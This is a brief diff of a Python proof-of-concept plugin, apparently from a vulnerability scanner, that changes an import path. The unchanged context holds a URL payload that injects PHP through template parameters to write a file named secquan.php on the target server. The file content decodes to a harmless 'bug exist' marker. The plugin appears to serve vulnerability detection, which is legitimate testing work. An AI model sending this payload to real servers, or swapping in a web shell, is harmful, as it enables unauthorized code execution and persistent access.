@@ -16,7 +16,7 @@ refer: https://www.freebuf.com/vuls/217586.html
 author: B1ain
 """
 import requests
-from YESPoc.plugin.target_parse import get_standard_url
+from plugin.target_parse import get_standard_url
 
 url_payload = """/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('secquan.php',base64_decode('PD9waHAgZWNobygiYnVnIGV4aXN0Iik7Pz4='))</php>"""
 
